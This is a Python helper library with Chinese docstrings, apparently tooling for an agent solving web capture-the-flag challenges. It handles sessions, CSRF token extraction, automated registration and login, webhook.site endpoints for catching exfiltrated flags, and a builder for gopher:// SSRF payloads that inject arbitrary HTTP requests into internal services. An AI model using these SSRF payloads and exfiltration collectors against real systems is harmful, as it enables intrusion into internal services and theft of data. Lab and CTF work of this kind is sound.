"""summary: Web 安全分析公共工具库

description:
  封装 Web 安全分析中的高频操作（HTTP session 管理、CSRF 提取、注册登录、
  webhook.site 交互、gopher SSRF URL 构造）。每个函数可独立使用，不强制组合调用。

  依赖: requests, beautifulsoup4, lxml（通过 $PYTHON_CMD 调用）

  调用方式:
    import sys
    sys.path.insert(0, "$AGENT_DIR/scripts")
    from web_helpers import create_session, get_csrf, register_and_login, build_gopher_url

usage:
  作为库模块被 import，不作为命令行工具使用。回归测试: test_web_helpers.py。

level: intermediate
"""

import re
from typing import Optional
from urllib.parse import unquote_to_bytes

import requests
from bs4 import BeautifulSoup
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# Content-Length 头识别（含 RFC 7230 禁止的冒号前空格畸形形态——归一而非追加第二个）
_CL_HEADER_RE = re.compile(r"content-length\s*:", re.IGNORECASE)


def create_session(
    base_url: str,
    timeout: int = 10,
    retries: int = 3,
    backoff_factor: float = 0.5,
) -> requests.Session:
    """创建预配置的 requests.Session。

    - 设置 base_url 作为请求前缀
    - 自动重试（3 次，指数退避）
    - 默认 timeout 10 秒
    - 自动跟随重定向
    - User-Agent 伪装为常见浏览器

    Args:
        base_url: 目标站点根 URL（如 "http://example.com:8080"）
        timeout: 默认请求超时（秒）
        retries: 重试次数
        backoff_factor: 重试退避因子

    Returns:
        配置好的 requests.Session（已设置 base_url 为 .base_url 属性）
    """
    session = requests.Session()

    # 重试策略
    retry_strategy = Retry(
        total=retries,
        backoff_factor=backoff_factor,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["GET", "POST", "PUT", "DELETE", "PATCH"],
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)

    # 默认 headers
    session.headers.update({
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/125.0.0.0 Safari/537.36"
        ),
    })

    # 存储配置（方便后续函数读取）
    session.base_url = base_url.rstrip("/")  # type: ignore[attr-defined]
    session.timeout = timeout  # type: ignore[attr-defined]

    return session


def get_csrf(
    session: requests.Session,
    url: str,
    field_name: str = "csrf_token",
) -> str:
    """从 HTML 页面提取 CSRF token。

    按优先级依次查找：
    1. <meta name="{field_name}"> 标签的 content 属性
    2. <input name="{field_name}"> 标签的 value 属性
    3. <input name="{field_name.replace('_', '-')}"> （兼容连字符变体）

    Args:
        session: 已配置的 requests.Session
        url: 要获取的页面完整 URL
        field_name: CSRF token 的字段名（默认 "csrf_token"）

    Returns:
        CSRF token 字符串

    Raises:
        ValueError: 页面中找不到 CSRF token
        requests.RequestException: HTTP 请求失败
    """
    timeout = getattr(session, "timeout", 10)
    resp = session.get(url, timeout=timeout)
    resp.raise_for_status()

    soup = BeautifulSoup(resp.text, "lxml")

    # 1. meta 标签
    meta = soup.find("meta", attrs={"name": field_name})
    if meta and meta.get("content"):
        return meta["content"]

    # 2. input hidden 标签（原字段名）
    inp = soup.find("input", attrs={"name": field_name})
    if inp and inp.get("value"):
        return inp["value"]

    # 3. input hidden 标签（连字符变体：csrf_token → csrf-token）
    if "_" in field_name:
        alt_name = field_name.replace("_", "-")
        inp = soup.find("input", attrs={"name": alt_name})
        if inp and inp.get("value"):
            return inp["value"]

    raise ValueError(
        f"在 {url} 中未找到 CSRF token（字段名: {field_name}）。"
        f"响应前 500 字符: {resp.text[:500]}"
    )


def register_and_login(
    session: requests.Session,
    base_url: str,
    username: str,
    password: str,
    register_path: str = "/register",
    login_path: str = "/login",
) -> requests.Session:
    """注册新用户并登录。

    流程:
    1. GET {register_path} → 提取 CSRF token
    2. POST {register_path} → 提交注册表单
    3. GET {login_path} → 提取 CSRF token
    4. POST {login_path} → 提交登录表单

    Args:
        session: 已配置的 requests.Session
        base_url: 目标站点根 URL
        username: 注册用户名
        password: 注册密码
        register_path: 注册页面路径（默认 "/register"）
        login_path: 登录页面路径（默认 "/login"）

    Returns:
        已登录的 session（cookies 已设置）

    Raises:
        ValueError: 注册或登录失败
        requests.RequestException: HTTP 请求失败
    """
    base = base_url.rstrip("/")
    timeout = getattr(session, "timeout", 10)

    # 1. 注册
    register_url = base + register_path
    try:
        csrf = get_csrf(session, register_url)
    except ValueError:
        # 注册页面可能没有 CSRF，尝试直接 POST
        csrf = None

    reg_data = {"username": username, "password": password}
    if csrf:
        reg_data["csrf_token"] = csrf

    resp = session.post(register_url, data=reg_data, timeout=timeout)
    if resp.status_code not in (200, 201, 302, 303):
        raise ValueError(
            f"注册失败: HTTP {resp.status_code}。响应: {resp.text[:300]}"
        )

    # 2. 登录
    login_url = base + login_path
    try:
        csrf = get_csrf(session, login_url)
    except ValueError:
        csrf = None

    login_data = {"username": username, "password": password}
    if csrf:
        login_data["csrf_token"] = csrf

    resp = session.post(login_url, data=login_data, timeout=timeout)
    if resp.status_code not in (200, 302, 303):
        raise ValueError(
            f"登录失败: HTTP {resp.status_code}。响应: {resp.text[:300]}"
        )

    return session


def extract_flag_from_webhook(
    uuid: str,
    keyword: str = "SK-CERT",
    api_base: str = "https://webhook.site",
) -> Optional[str]:
    """从 webhook.site API 提取 flag。

    读取 webhook.site 端点的所有请求，搜索包含指定关键词的内容。

    Args:
        uuid: webhook.site 端点的 UUID
        keyword: flag 前缀关键词（默认 "SK-CERT"）
        api_base: webhook.site API 地址

    Returns:
        flag 字符串，未找到则返回 None

    Raises:
        requests.RequestException: API 请求失败
    """
    api_url = f"{api_base}/uuid/{uuid}/requests"
    resp = requests.get(api_url, timeout=15)
    resp.raise_for_status()

    data = resp.json()
    requests_list = data.get("data", [])

    # 编译 flag 正则（keyword + {xxx} 格式）
    flag_pattern = re.compile(rf"{re.escape(keyword)}\{{[^}}]+\}}")

    def _search_flag(text: str) -> Optional[str]:
        """在文本中搜索 flag 模式，找到则返回，否则返回 None。"""
        match = flag_pattern.search(text)
        return match.group(0) if match else None

    # 按时间倒序搜索（最新的请求优先）
    for req in reversed(requests_list):
        # 搜索 query string
        result = _search_flag(req.get("query", ""))
        if result:
            return result

        # 搜索请求体
        result = _search_flag(req.get("content", "") or "")
        if result:
            return result

        # 搜索 headers
        headers = req.get("headers", {})
        header_iter = headers.values() if isinstance(headers, dict) else headers
        for header_value in header_iter:
            result = _search_flag(str(header_value))
            if result:
                return result

    return None


def create_webhook(api_base: str = "https://webhook.site") -> str:
    """创建 webhook.site 端点。

    Args:
        api_base: webhook.site API 地址

    Returns:
        新创建端点的 UUID

    Raises:
        requests.RequestException: API 请求失败
        ValueError: 创建失败（无 UUID 返回）
    """
    api_url = f"{api_base}/token"
    resp = requests.post(api_url, timeout=15)
    resp.raise_for_status()

    data = resp.json()
    uuid_val = data.get("uuid")
    if not uuid_val:
        raise ValueError(f"创建 webhook 失败: 响应中无 UUID。响应: {resp.text[:300]}")

    return uuid_val


def _encode_selector(text: str, *, escape_percent: bool = False) -> str:
    """把 HTTP 请求文本编码为 gopher selector 安全形态。

    规则: \\r→%0D、\\n→%0A、空格→%20、?→%3F、#→%23（?/# 在 URL 中有
    query/fragment 语义，不编码会被截断）、其余控制字符与非 ASCII 按
    UTF-8 逐字节 %XX 编码; 可打印 ASCII 直通。

    escape_percent=True 时 ``%``→``%25``（用于请求行/头: libcurl 发送
    selector 前会百分号解码，不二次编码则头里的字面 %XX 线上被解码变形）。
    body 不开启——body 的 %XX 线上解码是既定语义（CL 修正按解码后字节
    数计算），需线上保留字面 %XX 时调用方在 body 中写 %25XX。
    """
    out: list[str] = []
    for ch in text:
        if ch == "\r":
            out.append("%0D")
        elif ch == "\n":
            out.append("%0A")
        elif ch == " ":
            out.append("%20")
        elif ch == "?":
            out.append("%3F")
        elif ch == "#":
            out.append("%23")
        elif ch == "%" and escape_percent:
            out.append("%25")
        elif ord(ch) < 0x20 or ord(ch) > 0x7E:
            for b in ch.encode("utf-8"):
                out.append(f"%{b:02X}")
        else:
            out.append(ch)
    return "".join(out)


def build_gopher_url(
    host: str,
    port: int,
    raw_request: str,
    *,
    fix_content_length: bool = True,
) -> str:
    """构造携带完整 HTTP 请求的 gopher:// URL（SSRF 任意字节注入用）。

    把请求行+头+body 的完整 HTTP/1.1 请求文本编码为 gopher selector，
    返回 ``gopher://host:port/_<selector>``。

    传输契约——libcurl 发送 selector 前做百分号解码:
    - 请求行/头: 本函数对 ``%`` 二次编码，**所见即所得**（输入字节 ==
      线上字节，``GET /a%20b`` 线上原样保留）;
    - body: 字面 ``%XX`` 线上被解码（``%3C``→``<``），需线上保留字面
      ``%XX`` 时在 body 中写 ``%25XX``。

    版本边界: libcurl ≥ 8.22.0 拒绝解码后含 CR/LF 的 gopher selector
    （``CURLE_URL_MALFORMAT``; TCP 连接已建立但 0 字节发出即关闭）——目标
    fetcher 为新版时本函数产物无法发出，先确认 fetcher 的 libcurl 版本
    （webhook 回显 UA）; 本地用新版 curl 验证产物会全部 rc=3 被拒，需
    <8.22.0 的 curl 或裸 socket 客户端复现。libcurl 在 selector 后固定
    追加一个 CRLF（无 body 请求恰好补成头块空行; 有 body 时 body 尾部
    多 2 字节，按 CL 读取无影响）。

    关键防护——Content-Length 自动修正（fix_content_length=True，默认）:
    body 中的字面 ``%XX``（如 urlencoded 表单 ``content=%3Ch1%3E``）经
    libcurl 解码后线上只占 1 字节，手工按编码前字符串计算的 CL 会虚大，
    导致服务端按 CL 永久等待 body（表现为目标"挂起"）。本函数按
    **解码后字节数**（``len(unquote_to_bytes(...))``）重算并回写
    Content-Length（缺失则补写、重复则去重），杜绝该坑。
    无 body 时移除遗留的 Content-Length（CL>0 配 0 字节 body 会导致服务端
    挂起），不添加新的; `fix_content_length=False` 时请求头原样保留。

    Args:
        host: 目标主机（如 "127.0.0.1"）
        port: 目标端口（如 8000）
        raw_request: 完整 HTTP 请求文本，头与 body 以 ``\\r\\n\\r\\n`` 分隔
        fix_content_length: True 时按解码后字节数重算 CL; False 时请求头
            原样保留（调用方自负 CL 正确性）

    Returns:
        gopher URL 字符串

    Raises:
        ValueError: raw_request 为空或头块未以空行（连续两个 CRLF）终止——
            缺空行时服务端会永久等待头块结束（正是本函数要杜绝的挂起）
    """
    if not raw_request or "\r\n\r\n" not in raw_request:
        raise ValueError(
            f"raw_request 需为完整 HTTP 请求（头块以空行 CRLF CRLF 终止），收到: {raw_request[:80]!r}"
        )

    head, sep, body = raw_request.partition("\r\n\r\n")

    if sep and fix_content_length:
        if body:
            # 线上实际字节 = libcurl 对 selector 解码后的字节
            wire_len = len(unquote_to_bytes(_encode_selector(body)))
            new_lines: list[str] = []
            replaced = False
            for line in head.split("\r\n"):
                if _CL_HEADER_RE.match(line):
                    if replaced:
                        # 重复 Content-Length 是请求走私特征，丢弃后续
                        continue
                    new_lines.append(f"Content-Length: {wire_len}")
                    replaced = True
                else:
                    new_lines.append(line)
            if not replaced:
                new_lines.append(f"Content-Length: {wire_len}")
            head = "\r\n".join(new_lines)
        else:
            # 空 body: 移除遗留 Content-Length（CL>0 配 0 字节 body → 服务端挂起）
            head = "\r\n".join(
                line for line in head.split("\r\n") if not _CL_HEADER_RE.match(line)
            )

    if sep:
        selector = (
            _encode_selector(head, escape_percent=True)
            + "%0D%0A%0D%0A"
            + _encode_selector(body)
        )
    else:
        selector = _encode_selector(head, escape_percent=True)
    return f"gopher://{host}:{port}/_{selector}"
